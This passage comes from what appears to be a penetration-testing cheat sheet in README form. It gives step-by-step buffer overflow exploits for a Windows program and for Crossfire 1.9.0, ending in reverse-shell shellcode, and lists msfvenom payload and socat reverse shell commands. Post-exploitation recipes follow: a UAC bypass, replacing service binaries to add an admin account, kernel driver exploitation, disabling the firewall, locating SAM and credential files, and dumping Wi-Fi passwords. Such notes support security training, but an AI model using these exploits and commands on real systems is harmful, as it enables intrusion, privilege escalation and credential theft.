        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        )

        # 148011B2
        shellcode = "A" * 1252 + "B" * 4 + badchars

        # Opening for writing in binary mode
        with open('exploit.txt', 'wb') as f:
            # Force Latin-1 encoding (read more: https://python.plainenglish.io/python-2-vs-python-3-key-differences-40c78d2ced89)
            f.write(shellcode.encode('latin-1'))
        ```
        
        <br></br>
        
        <b>Find Modules</b>
        
        ```
        !mona modules
        ```
        
        <b>JMP ESP</b>
        
        ```
        !mona find -s "\xff\xe4" -m "vuln.exe"
        ```
        
        <b>now go down the list from results and take each address to find what works for next steps</b>
        <b>in Immunity debugger click the black arrow under options</b>
        
        
        ![image](https://user-images.githubusercontent.com/75488156/183314484-0c1b2c57-fd22-4ae9-ba08-14cce0ce61a7.png)
        
        
        ```
        Enter Address found in last step
        ```
        ```
        F2 on JMP
        ```
        
        
        <br></br>
        <b>Create Shell</b>
        
        ```
        msfvenom -e x86/shikata_ga_nai --platform Windows -p windows/exec CMD="cmd.exe" -f c -b "\x00\x0a\x1a\x1b\x69\xae\xce EXITFUNC=thread"
        ```
        
        
        ```
        #!/usr/bin/env python3

        # \x00\x0a\x1a\x1b\x69\xae\xce

        shell = (
        
        )

        # 148011B2
        shellcode = "A" * 1252 + "\xb2\x11\x80\x14" + "\x90" * 30 + shell

        # Opening for writing in binary mode
        with open('exploit.txt', 'wb') as f:
            # Force Latin-1 encoding (read more: https://python.plainenglish.io/python-2-vs-python-3-key-differences-40c78d2ced89)
            f.write(shellcode.encode('latin-1'))

        ```
        
        <br></br>
     
        
    </details>
    
    <details>
    <summary>Linux Buffer Overflow: Crossfire 1.9.0</summary>
    
    +
        <b>Start Crossfire</b>
        
        ```
        cd /usr/games/crossfire/bin
        ```
        
        <b>Start EDB</b>
        
        ```
        edb
        ```
        ```
        File --> Attach --> Select Crossfire --> OK --> Run(F9)
        ```
        
        <b>Proof of Concept</b>
        
        ```
        #!/usr/bin/python
        import socket

        host = "x.x.x.x"

        crash = "\x41" * 4379

        buffer = "\x11(setup sound " + crash + "\x90\x00#"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print "[*]Sending evil buffer..."

        s.connect((host, 13327))
        print s.recv(1024)

        s.send(buffer)
        s.close()

        print "[*]Payload Sent !"
        ```
        
        <b>Control EIP</b>
        
        ```
        msf-pattern_create -l 4379
        ```
        ```
        #!/usr/bin/python
        import socket

        host = "x.x.x.x"

        pattern = ""

        buffer = "\x11(setup sound " + pattern + "\x90\x00#"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print "[*]Sending evil buffer..."

        s.connect((host, 13327))
        print s.recv(1024)

        s.send(buffer)
        s.close()

        print "[*]Payload Sent !"
        ```
        
        Note the EIP address after running ex: 4368
        
        ```
        msf-pattern_offset -q 4368
        ```
        ```
        #!/usr/bin/python
        import socket

        host = "x.x.x.x"

        crash = "\x41" * 4368 + "B" * 4 + "C" * 7

        buffer = "\x11(setup sound " + crash + "\x90\x00#"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print "[*]Sending evil buffer..."

        s.connect((host, 13327))
        print s.recv(1024)

        s.send(buffer)
        s.close()

        print "[*]Payload Sent !
        ```
        
        <br></br>
        
        <b>Locating Space for Shellcode: Not enough space for shellcode</b>
        
        ```
        nsf-nasm_shell
        ```
        
        increase value of eax to 12
        
        ```
        add eax,12
        ```
        jmp to address of eax
        
        ```
        jmp eax
        ```
        ```
        #!/usr/bin/python
        import socket

        host = "x.x.x.x"

        padding = "\x41" * 4368
        eip = "\x42\x42\x42\x42"
        first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90
        buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print "[*]Sending evil buffer..."

        s.connect((host, 13327))
        print s.recv(1024)

        s.send(buffer)
        s.close()

        print "[*]Payload Sent !
        ```
        
        <br></br>
        <b>Checking for Bad Characters</b>
        
        ```
        #!/usr/bin/python
        import socket

        host = "x.x.x.x"

        padding = "\x41" * 4368
        eip = "\x42\x42\x42\x42"
        first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90
        
        badchars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        )
        
        buffer = "\x11(setup sound " + padding + eip + first_stage + badchars "\x90\x00#"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print "[*]Sending evil buffer..."

        s.connect((host, 13327))
        print s.recv(1024)

        s.send(buffer)
        s.close()

        print "[*]Payload Sent !
        ```
        
        <b>Finding a Return Address</b>
        
        ```
        Plugins --> OpcodeSearcher --> Opcode Search --> ESP->EIP --> FIND --> use first jmp esp instruction 
        ```
        ```
        Plugins --> BreakpointManager --> Breakpoints --> Add Breakpoint --> Paste in Address of jmp esp instruction --> OK --> Play(F9)
        ```
        ```
        #!/usr/bin/python
        import socket

        host = "x.x.x.x"

        padding = "\x41" * 4368
        eip = "\x96\x45\x13\x08"
        first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90
        
        buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print "[*]Sending evil buffer..."

        s.connect((host, 13327))
        print s.recv(1024)

        s.send(buffer)
        s.close()

        print "[*]Payload Sent !
        ```
        
        <b>Getting Shell</b>
        
        ```
        msfvenom -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -b "\x00\x20" -f py -v shellcode
        ```
        ```
        #!/usr/bin/python
        import socket

        host = "x.x.x.x"

        nop_sled = "\x90" * 8  # NOP sled

        # msfvenom -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -b "\x00\x20" -f py

        shellcode =  ""
        shellcode += "\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"
        shellcode += "\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41"
        shellcode += "\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71"
        shellcode += "\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04"
        shellcode += "\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d"
        shellcode += "\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72"
        shellcode += "\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34"
        shellcode += "\x7f\x6d\x02\x36"

        padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
        eip = "\x96\x45\x13\x08"  # 0x08134596
        first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

        buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print "[*]Sending evil buffer..."

        s.connect((host, 13327))
        print s.recv(1024)

        s.send(buffer)
        s.close()

        print "[*]Payload Sent !"
        
        ```
        
        
    </details>
    
    <details>
    <summary>Other Scripts</summary>
    
    +
        <b>Bad Character Check (Convert to Latin1)</b>
        
        ```
        #!/usr/bin/env python3

        # \x00\x0a\x0f\x1a\x5f\xcd\

        badchars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        )

        # Opening for writing in binary mode
        with open('exploit.txt', 'wb') as f:
            # Force Latin-1 encoding (read more: https://python.plainenglish.io/python-2-vs-python-3-key-differences-40c78d2ced89)
            f.write(badchars.encode('latin-1'))
        ```
        
        <br></br>
        <b>msfvenom Raw output</b>
        
        ```
        msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 EXITFUNC=thread -f raw –e x86/shikata_ga_nai -b "\x00" > exploit.txt
        ```
        
       <br></br>
       <b>msfvenom  cmd.exe shell</b>
       
       ```
       msfvenom -a x86 --platform Windows -p windows/exec CMD="cmd.exe" -f c -b "\x00\x0a\x1a\xa0\x09\x0d" > shellcode.txt
       ```
       ```
       msfvenom -a x86 --platform Linux -p linux/x86/exec CMD="/bin/sh" -f c -b "\x00\x0a\x0d\x20\x37\x39\x7a\xc2"
       ```
       
       <b>Temp turn of ASRL</b>
       
       ```
       sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
       ```
       
    </details>
</details>
    
<br></br>
<H1>What are some Post Exploitation Techniques?</H1>

<details>
<summary>General Notes</summary>

+ <details>
    <summary>Spawn a tty</summary>

    + 
        <br></br>
        <b>nc two steps</b>

        ```
        rlwrap nc localhost 80
        ```
        ```
        rlwrap -r -f . nc
        ```

        <br></br>
        <b>kali machine</b>

        ```
        socat file:`tty`,raw,echo=0 tcp-listen:4444
        ```
        <b>Target Machine</b>

        ```
        socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:x.x.x.x:4444
        ```

        <br></br>

        ```
        /bin/sh -i
        ```
        ```
        /bin/bash -i
        ```
        ```
        python -c 'import pty; pty.spawn("/bin/bash")'
        ```
        ```
        perl -e 'exec "/bin/sh";'
        ```
        ```
        perl: exec "/bin/sh";
        ```
        ```
        ruby: exec "/bin/sh"
        ```
        ```
        lua: os.execute('/bin/sh')
        ```

        <br></br>
    </details>

    <details>
    <summary>Other Resources</summary>

    + 
        <br></br>
        <b>PowerSharpPack</b>

        ```
        https://github.com/S3cur3Th1sSh1t/PowerSharpPack
        ```

        <br></br>
        <b>Windows: LOLBAS</b>

        ```
        https://lolbas-project.github.io/#
        ```

        <b>Windows: Windows Privilege Escalation Fundmentals</b>

        ```
        https://www.fuzzysecurity.com/tutorials/16.html
        ```

        <b>Windows: SharpSuite</b>

        ```
        https://github.com/FuzzySecurity/Sharp-Suite
        ```

        <b>Windows: Watson</b>

        ```
        https://github.com/rasta-mouse/Watson
        ```

        <b>Windows: WinPwn</b>

        ```
        https://github.com/S3cur3Th1sSh1t/WinPwn
        ```

        <br></br>
        <b>Linux: GTFOBins</b>

        ```
        https://gtfobins.github.io/
        ```

        <b>Linux: g0tmi1k Linux Privilege Escalation</b>

        ```
        https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
        ```

    </details>
</details>

<details>
<summary>Windows</summary>

+ <details>
    <summary>Priviledge Escalation Scripts</summary>

    + 
        <b>Windows: Windows Exploit Suggester (Next-Generation)</b>

        ```
        https://github.com/bitsadmin/wesng
        ```
        <b>Windows: Sherlock</b>

        ```
        https://github.com/rasta-mouse/Sherlock
        ```

        <b>Windows: Powersploit</b>

        ```
        https://github.com/PowerShellMafia/PowerSploit
        ```

        <b>Windows: WinPeas</b>

        ```
        https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
        ```

        <b>Windows: PrivescCheck</b>

        ```
        https://github.com/itm4n/PrivescCheck
        ```

        <br></br>
    </details>
    
    
    <details>
    <summary>Windows Priv Esc</summary>

    + <details>
        <summary>windows-privesc-check2</summary>

        +
            <b>windows-privesc-check2.exe</b>

            ```
            windows-privesc-check2.exe --dump -G
            ```

        </details>

        <details>
        <summary>User Account Control: UAC</summary>

        +
            <b>Swith to Administrative CMD Prompt Powershell</b>

            ```
            powershell.exe Start-Process cmd.exe -Verb runAs
            ```


            <b>Bypass UAC: Administrator: Windows 10 build 1709: Fodhelper</b>
            <li>Gather Detailed information about program: Integrity level needed</li>

            ```
            sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
            ```

            <b>Gathering additional information with procmon</b>

            ```
            procmon.exe
            ```
            ```
            fodhelper.exe
            ```
            ```
            Filter > Filter > Process Name > fodhelper.exe > Add > Apply
            ```

            <b>See results for registry outputs</b>

            ```
            Filter > Filter > Operation > contains > Reg > Add > Apply
            ```

            <b>Filter only Registries that do not exist</b>

            ```
            Filter > Filter > Result > contains > NAME NOT FOUND > Add > Apply
            ```


            <b>Filter out HKEY_CURRENT_USER (HKCU) hive: Editable by current user</b>

             ```
            Filter > Filter > Path > contains > HKCU > Add > OK
            ```


            <b>What is Registry key used for?</b>

             ```
            Filter > Filter > Edit Path > contains > <PARTIAL_PATH_NAME_TO_COMMAND> > Remove Result Filter > OK
            ```

            <b>Add Key in registry</b>

            ```
            REG ADD <PATH_NAME_TO_COMMAND>
            ```
            ```
            Filter > Filter > Result > is > NAME NOT FOUND > Add > Apply
            ```
            ```
            clear button 5th icon from left "white paper and eraser"
            ```
            ```
            fodhelper.exe
            ```

            <b>Add empty DelegateExecute entry so that fodhelper launches program from default key entry</b>

            ```
            REG ADD <PATH_NAME_TO_COMMAND> /v DelegateExecute /t REG_SZ
            ```
            ```
            Filter > Filter > Replace filter NAME NOT FOUND with SUCCESS > ADD > OK
            ```
            ```
            fodhelper.exe
            ```

            <b><PATH_NAME_TO_COMMAND>\(Default): Replacing empty contents with Executable: cmd</b>

            ```
            REG ADD <PATH_NAME_TO_COMMAND> /d "cmd.exe" /f
            ```
            ```
            fodhelper.exe
            ```

        </details>

        <details>
        <summary>Insecure File Permissions</summary>

        +
            <li>Powershell: List Running Services</li>

            ```
            Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
            ```

            <li>Enumerate Service Permissions: Look for Users with (F): F = Full access</li>

            ```
            icacls "C:\Program Files\<PATH_OF_SERVICE>"
            ```
            ```
            icacls "C:\Program Files\*" | findstr /c:"Users" | findstr /c:"(F)"
            ```

            <li>Replace Service with own Malicious Binary</li>
            <li>addusers.c</li>

            ```
            #include <stdlib.h>

            int main ()
            {
              int i;

              i = system ("net user CEO password123 /add");
              i = system ("net localgroup administrators CEO /add");

              return 0;
            }
            ```
            ```
            sudo i686-w64-mingw32-gcc adduser.c -o adduser.exe
            ```

            <li>Transfer file to Windows FTP Server/li>
            <li>Replace Service with Malicious Binary</li>

            ```
            move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"
            ```
            ```
            move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
            ```
            ```
            dir "C:\Program Files\Serviio\bin\"
            ```

            <li>Check if Service Starts on Boot</li>

            ```
            wmic service where caption="Serviio" get name, caption, state, startmode
            ```

            <li>Does Current User have rights to Restart System? Priv Shutdown=Disabled</li>

            ```
            whoami /priv
            ```

            <li>Reboot</li>

            ```
            shutdown /r /t 0
            ```

            <li>Login with new Username and Password</li>
            <li>Confirm User Group</li>

            ```
            net localgroup Administrators
            ```

        </details>

        <details>
        <summary>Leveraging Unquoted Service Paths</summary>

        +
            <b>Look for Pathname that has directory name with spaces but no quotes</b>

            ```
            wmic service get displayname,pathname
            ```

            <b>adduser.c</b>

            ```
            #include <stdlib.h>

            int main ()
            {
              int i;

              i = system ("net user CEO password123 /add");
              i = system ("net localgroup administrators CEO /add");

              return 0;
            }
            ```
            ```
            sudo i686-w64-mingw32-gcc adduser.c -o adduser.exe
            ```

            <b>Move adduser.exe to File directory found Example:</b>

            ```
            move adduser.exe "c:\Program Files\My Program\adduser.exe
            ```

            <b>Restart machine and Sign in with New user</b>

            ```
            shutdown /r /t 0
            ```

        </details>

        <details>
        <summary>Windows Kernel Driver vulnerability</summary>

        +
            <b>Accurately Identify Operating System, Version, and Architecture</b>

            ```
            systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
            ```

            <b>Option 1: Investigate 3rd party driver exploits</b>

            <li>Look for 3rd party Drivers</li>

            ```
            driverquery /v
            ```

            <li>Search for exploits for found 3rd party driver</li>

            ```
            searchsploit <Name_of_Driver>
            ```

            <li>Look for version of driver matches exploit</li>

            ```
            cd "c:\Program Files"
            ```
            ```
            dir
            ```
            ```
            cd <DriverNameFolder>
            ```
            ```
            notepad <DriverName>.inf
            ```

            <b>Compile Exploit on windows machine</b>


            ```
            cd "C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1"
            ```
            ```
            mingw-w64.bat
            ```
            ```
            gcc --help
            ```


            <li>Transfer exploit from Kali to windows test machine to compile</li>

            <li>Compile</li>

            ```
            gcc xxxxx.c -o exploit.exe
            ```

            <li>Transfer from Test Windows to Target Windows</li>

            ```
            copy exploit.exe \\x.x.x\users\<name>
            ```

            <li>Run exploit</li>

            ```
            cd c:\Users\<name>
            ```
            ```
            whoami
            ```
            ```
            exploit.exe
            ```
            ```
            whoami
            ```

            <b>Option 2: Search for Native kernal vulnerability For Example Windows 7 Service Pack 1 X86 </b>
            
            <br></br>

        </details>
    </details>
    
    <details>
    <summary>Sensitive Windows Files</summary>

    + 
        <b>File Locations</b>

        ```
        %windir%\repair\sam
        ```
        ```
        %windir%\System32\config\RegBack\SAM
        ```
        ```
        %windir%\repair\system
        ```
        ```
        %windir%\repair\software
        ```
        ```
        %windir%\repair\security
        ```
        ```
        %windir%\debug\NetSetup.log (AD domain name, DC name, internal IP, DA account)
        ```
        ```
        %windir%\iis6.log (5,6 or 7)
        ```
        ```
        %windir%\system32\logfiles\httperr\httperr1.log
        ```
        ```
        C:\sysprep.inf
        ```
        ```
        C:\sysprep\sysprep.inf
        ```
        ```
        C:\sysprep\sysprep.xml
        ```
        ```
        %windir%\Panther\Unattended.xml
        ```
        ```
        C:\inetpub\wwwroot\Web.config
        ```
        ```
        %windir%\system32\config\AppEvent.Evt (Application log)
        ```
        ```
        %windir%\system32\config\SecEvent.Evt (Security log)
        ```
        ```
        %windir%\system32\config\default.sav
        ```
        ```
        %windir%\system32\config\security.sav
        ```
        ```
        %windir%\system32\config\software.sav
        ```
        ```
        %windir%\system32\config\system.sav
        ```
        ```
        %windir%\system32\inetsrv\config\applicationHost.config
        ```
        ```
        %windir%\system32\inetsrv\config\schema\ASPNET_schema.xml
        ```
        ```
        %windir%\System32\drivers\etc\hosts (dns entries)
        ```
        ```
        %windir%\System32\drivers\etc\networks (network settings)
        ```
        ```
        %windir%\system32\config\SAM (only really useful if you have access to the files while the machine is off)
        ```
        ```
        %windir%\unattend.xml
        ```
        ```
        %windir%\Windows\Panther\Unattend.xml
        ```
        ```
        %windir%\Windows\Panther\Unattend\Unattend.xml
        ```
        ```
        %windir%\Windows\system32\sysprep.inf
        ```
        ```
        %windir%\Windows\system32\sysprep\sysprep.xml
        ```
        ```
        C:\ProgramData\Configs\*
        ```
        ```
        C:\Program Files\Windows PowerShell\*
        ```
        ```
        dir c:*vnc.ini /s /b
        ```
        ```
        dir c:*ultravnc.ini /s /b
        ```

        <br></br>
        <b>Search For Contents within File</b>

        ```
        cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
        ```
        ```
        findstr /si password *.xml *.ini *.txt *.config
        ```
        ```
        findstr /spin "password" *.*    
        ```

        <br></br>
        <b>Search for File with Certain Name</b>

        ```
        dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
        ```
        ```
        where /R C:\ user.txt
        ```
        ```
        where /R C:\ *.ini 
        ```

        <br></br>
    </details>
    
    <details>
    <summary>File Permissions</summary>
    
    +
         <b>SysinternalSuite: Files with insufficient access restrictions</b>
        
        ```
        accesschk.exe -uws "Everyone" "C:\Program Files"
        ```
        
        <b>Powershell: Files with insufficient access restrictions</b>
        
        ```
        Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
        ```
        
    </details>
    
    <details>
    <summary>Installed Application</summary>

    + 
        <b>PowerShell</b>

        ```
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize
        ```

        <br></br>
        <b>Obtaining a list of programs from a remote system</b>

        ```
        Invoke-command -computer remote_pc_name {Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize }
        ```

        <br></br>
        <b>Pull List of Software Installed on Users System</b>

        ```
        $listsoftware= Get-ChildItem HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall

        $names = $listsoftware |foreach-object {Get-ItemProperty $_.PsPath}

        foreach ($name in $names)
        {
            Write-Host $name.Displayname
        }
        ```

        <br></br>
        <b>WMI</b>

        ```
        Get-WmiObject -Class Win32_Product | Select-Object -Property Name > C:\InstalledSoftwareList.txt
        ```

        <b>Review Installed Windows Features</b>

        ```
        Get-WindowsFeature | Where-Object {$_.InstallState -eq 'Installed'}
        ```

        <br></br>
        <b>WMIC (Planned to be Deprecated)(Can be very Slow to run)</b>

        ```
        wmic /output:C:\InstalledSoftwareList.txt product get name,version
        ```
        ```
        wmic product get name,version,vendor
        ```
        ```
        wmic qfe get Caption,Description,HotFixID,InstalledOn
        ```
        
        
        <b>WMIC: Save to Text File</b>

        ```
        wmic product get name,version /format:csv > C:\InstalledSoftware.csv
        ```

        <br></br>
    </details>
    
    <details>
    <summary>Network</summary>

    + 
        <b>List all network interfaces, IP, and DNS</b>

        ```
        ipconfig /all
        ```
        ```
        Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
        ```
        ```
        Get-DnsClientServerAddress -AddressFamily IPv4 | ft
        ```

        <br></br>
        <b>List all current connections</b>

        ```
        netstat -nao
        ```

        <br></br>
        <b>List firewall state and current configuration</b>

        ```
        netsh advfirewall firewall dump
        ```
        ```
        netsh firewall show state
        ```
        ```
        netsh firewall show config
        ```
        ```
        netsh advfirewall show currentprofile
        ```
        
        <br></br>
        <b>Show Firewall Rules</b>
        
        ```
        netsh advfirewall firewall show rule name=all
        ```

        <br></br>
        <b>List firewall's blocked ports: Powershell</b>

        ```
        $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq "0"} | select name,applicationname,localports
        ```

        <br></br>
        <b>Disable firewall</b>

        ```
        netsh firewall set opmode disable (Older Versions of Windows)
        ```
        ```
        netsh advfirewall set allprofiles state off
        ```

        <br></br>
        <b>List current routing table</b>

        ```
        route print
        ```
        ```
        Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
        ```

        <br></br>
        <b>List the ARP table</b>

        ```
        arp -A
        ```
        ```
        Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
        ```

        <br></br>
        <b>List all network shares</b>

        ```
        net share
        ```

        <br></br>
        <b>Wifi Passwords: Finding The SSID</b>

        ```
        netsh wlan show profile
        ```

        <b>Wifi Passwords: Obtain Cleartext password</b>

        ```
        netsh wlan show profile key=clear
        ```
        ```
        cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
        ```

        <br></br>
    </details>
    
    <details>
    <summary>Running Processes</summary>

    + 
        <b>Check for Processes</b>

        ```
        tasklist
        ```
        ```
        tasklist /SVC
        ```
        ```
        wmic process list full
        ```

        <br></br>
        <b>Check for Processes in PowerShell</b>

        ```
        Get-Process
        ```
        ```
        Get-Process -Name 'Notepad'
        ```
       

        <b>List Path of Running Process</b>

        ```
        (Get-Process -Name 'Calculator').Path
        ```

        <br></br>
    </details>
    
    <details>
    <summary>Scheduled Jobs/Tasks</summary>

    + 
        <b>View Tasks</b>

        ```
        schtasks
        ```
        ```
        schtasks /query /fo LIST /v
        ```

        <b>Impacket</b>

        ```
        python3 atexec.py Domain/Administrator:<password>@123@172.21.0.0 systeminfo</password>
        ```

        <br></br>
    </details>
    
    <details>
    <summary>System Information</summary>

    + 
        <b>Command Line</b>

        ```
        systeminfo
        ```
        ```
        systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
        ```

        <b>PowerShell</b>

        ```
        Get-ComputerInfo
        ```
        ```
        Get-ComputerInfo -Property "*version"
        ```
        ```
        Get-ComputerInfo -Property "*version", "os*" | select WindowsCurrentVersion, WindowsVersion, OsName, OsBuildNumber, OsHotFixes, OsArchitecture | fl
        ```
        ```
        $PSVersionTable
        ```

        <b>Obtaining Sytem Enviornment Variables</b>

        ```
        Get-ChildItem -Path Env:\
        ```

        <br></br>
    </details>
    
    <details>
    <summary>Enumerating Other</summary>
    
    +
        <b>Unmounted Disks</b>
        
        ```
        mountvol
        ```
        
        <b>Device Drivers and Kernel Modules: Powershell</b>
        
        ```
        driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
        ```
        
        <b>Version Number for Device Drivers</b>
        
        ```
        Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
        ```
        
        <b>Binaries that AutoElevate</b>
        
        ```
        reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
        ```
        ```
        reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
        ```
        
        <br></br>
    </details>
    
    <details>
    <summary>Users and Groups</summary>

    + 
        <b>Current User</b>

        ```
        whoami
        ```

        <br></br>
        <b>View information about the current user</b>

        ```
        net user afsimmons
        ```
        ```
        net user afsimmons /domain (For a domain user)
        ```
        
        <b>View Other Users</b>
        
        ```
        net user
